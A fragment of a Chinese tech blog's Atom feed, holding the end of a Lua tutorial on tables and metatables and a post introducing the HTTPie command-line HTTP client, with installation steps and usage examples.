class="line"></div><div class="line">tab=&#123;10,m=20,11,12,13&#125;</div><div class="line">print(tab[1]) =10</div><div class="line">print(tab[2]) =11</div><div class="line">print(tab[3]) =12</div><div class="line">print(tab[4]) =13</div><div class="line"></div><div class="line">get table length</div><div class="line">print(table.getn(tab))  -&gt; 4</div><div class="line">print(#tab)             -&gt; 4</div><div class="line"></div><div class="line">for k,v in pairs(tab) do</div><div class="line">		print(k,&quot;:&quot;,v)</div><div class="line">end</div><div class="line"></div><div class="line">1:10</div><div class="line">2:11</div><div class="line">3:12</div><div class="line">4:13</div><div class="line">m:20</div><div class="line"></div><div class="line">注释：</div><div class="line">a)省略key,会自动以1开始编号，并跳过设置过的key</div><div class="line">b)获取表长度，只有当表使用1自动编号开始，可以获取</div></pre></td></tr></table></figure>
</li>
</ul>
<h5 id="lua表空判断"><a href="#lua表空判断" class="headerlink" title="lua表空判断"></a><b>lua表空判断</b></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">local a =&#123;&#125;</div><div class="line">判断table a是否为空，有提供api table.maxn(a) 或 #a 获取表a长度，</div><div class="line">该情况只针对key为数字且安装递增方式。</div><div class="line"></div><div class="line">对于自定义key的情况下，获取表长度会失败，可通过lua内置next函数解决</div></pre></td></tr></table></figure>
<h5 id="MetaTable和MetaMethod"><a href="#MetaTable和MetaMethod" class="headerlink" title="MetaTable和MetaMethod"></a><b>MetaTable和MetaMethod</b></h5><p>MetaTable和MetaMethod是lua中的重要语法，MetaTable用来做类似C++重载操作符的功能</p>
<p>假如有两个函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">fraction_a =&#123;numerator=2,denominator=3&#125;</div><div class="line">fraction_b =&#123;numerator=4,denominator=7&#125;</div></pre></td></tr></table></figure></p>
<p>如果要实现分数见相加：2/3+4/7,执行fraction_a+fraction_b会报错<br>如果使用MetaTable,则如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">fraction_op=&#123;&#125;</div><div class="line">function fraction_op.__add(f1,f2)</div><div class="line">	ret = &#123;&#125;</div><div class="line">	ret.numerator=f1.numerator*f2.denominator+f2.numerator*f1.denominator</div><div class="line">	ret.denominator=f1.denominator*f2.denominator</div><div class="line">	return ret</div><div class="line">end</div><div class="line"></div><div class="line">setmetatable(fraction_a,fraction_op)</div><div class="line">setmetatable(fraction_a,fraction_op)</div><div class="line"></div><div class="line">fraction_s = fraction_a + fraction_b</div></pre></td></tr></table></figure></p>
<p>至于__add是MetaMethod,这是lua内建约定的，还有如下的MetaMethod：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">__add(a,b)  	对应a+b</div><div class="line">__sub(a,b)  	对应a-b</div><div class="line">__mul(a,b)		对应a*b</div><div class="line">__div(a,b)		对应a/b</div><div class="line">__mod(a,b)		对应a%b</div><div class="line">__pow(a,b)		对应a^b </div><div class="line">__unm(a)		对应-a</div><div class="line">__concat(a,b) 	对应a .. b</div><div class="line">__len(a)		对应#a</div><div class="line">__eq(a,b)		对应a==b</div><div class="line">__lt(a,b)		对应a&lt;b</div><div class="line">__le(a,b)   	对应a&lt;=b</div><div class="line">__index(a,b) 	对应a.b</div><div class="line">__newindex(a,b,c)		对应a.b=c</div><div class="line">__call(a,...)		对应a(...)</div></pre></td></tr></table></figure></p>
<p><a href="http://www.codingnow.com/2000/download/lua_manual.html" target="_blank" rel="external">Lua 5.1 参考手册</a><br><a href="http://17173ops.com/2013/11/01/17173-ngx-lua-manual.shtml#toc9" target="_blank" rel="external">lua基本语法</a><br><a href="http://book.luaer.cn/" target="_blank" rel="external">Programming in Lua</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h5 id=&quot;关键字&quot;&gt;&lt;a href=&quot;#关键字&quot; class=&quot;headerlink&quot; title=&quot;关键字&quot;&gt;&lt;/a&gt;&lt;b&gt;关键字&lt;/b&gt;&lt;/h5&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>HTTP调试工具HTTPie</title>
    <link href="https://t1ger.github.io/2017/01/19/HTTP%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7HTTPie/"/>
    <id>https://t1ger.github.io/2017/01/19/HTTP调试工具HTTPie/</id>
    <published>2017-01-19T09:33:50.000Z</published>
    <updated>2017-01-19T10:11:16.573Z</updated>
    
    <content type="html"><![CDATA[<p>HTTPie(读aych-tee-tee-pie)是一个 HTTP 的命令行客户端,其目标是让 CLI 和 web 服务之间的交互尽可能的人性化.<br>HTTPie 采用 Python 开发，底层用到了 Requests 和 Pygments 库，缺省支持json，比curl的语法更加简洁.</p>
<p>安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">#Debian，Ubuntu 或者 Linux Mint：</div><div class="line">sudo apt-get install httpie</div><div class="line">#linux</div><div class="line">pip install httpie</div><div class="line">#centos7 </div><div class="line">yum -y install python2-httpie.noarch</div></pre></td></tr></table></figure></p>
<p>用法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">#simulation commit a form</div><div class="line">http -f POST iweishao.com username=neo</div><div class="line"></div><div class="line">#display more detailed request</div><div class="line">http -v iweishao.com</div><div class="line"></div><div class="line">#display Header</div><div class="line">http -h iweishao.com</div><div class="line"></div><div class="line">#display Body</div><div class="line">http -b iweishao.com</div><div class="line"></div><div class="line">#download file</div><div class="line">http -d iweishao.com</div><div class="line"></div><div class="line">#request a delete method</div><div class="line">http DELETE iweishao.com</div><div class="line"></div><div class="line">#pass json data request(default json request)</div><div class="line">http PUT iweishao.com name=neo password=neo_password</div><div class="line">#if json data not string use := to serperate,eg</div><div class="line">http PUT iweishao.com name=neo password=neo_password age:=28 a:=true streets:=&apos;[&quot;a&quot;,&quot;b&quot;]&apos;</div><div class="line"></div><div class="line">#simulation Form Post method,Content-Type: application/x-www-form-urlencoded; charset=utf-8</div><div class="line">http --form POST iweishao.com name=&apos;neo&apos;</div><div class="line"></div><div class="line">#simulation Form upload,Content-Type: multipart/form-data</div><div class="line">http -f POST iweishao.com/jobs name=&apos;neo&apos; file@~/test.pdf</div><div class="line"></div><div class="line">#modify request header,use : serperate</div><div class="line">http iweishao.com User-Agent:Yhz/1.0 &apos;Cookie:a=b;b=c&apos; Referer:http://iweishao.com/</div><div class="line"></div><div class="line">#auth</div><div class="line">http -a username:password iweishao.com</div><div class="line">http --auth-type=digest -a username:password iweishao.com</div><div class="line"></div><div class="line">#use http proxy</div><div class="line">http --proxy=http:http://192.168.1.130:8060 iweishao.com</div><div class="line">http --proxy=http:http://user:pass@192.168.1.130:8060 iweishao.com</div></pre></td></tr></table></figure></p>
<p>高级用法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"># display all and direct</div><div class="line">http --all --follow iweishao.com/redirect/3</div><div class="line"></div><div class="line">#download binary file</div><div class="line">http example.org/movie.mov &gt;mov.mov</div><div class="line"></div><div class="line">#download image,use Imagemagick convert, upload another website</div><div class="line">http octodex.example.com/images/original.jpg |convert - -resize 25% - | http iweishao/Octocats</div><div class="line"># put auth info to session</div><div class="line">http --session=user1 -a user:password example.org X-foo:Bar</div><div class="line">#use before auth session visite</div><div class="line">http --session=user example.org</div></pre></td></tr></table></figure></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;HTTPie(读aych-tee-tee-pie)是一个 HTTP 的命令行客户端,其目标是让 CLI 和 web 服务之间的交互尽可能的人性化.&lt;br&gt;HTTPie 采用 Python 开发，底层用到了 Requests 和 Pygments 库，缺省支持json，比cu
    
    </summary>
    
    
  </entry>
  
</feed>
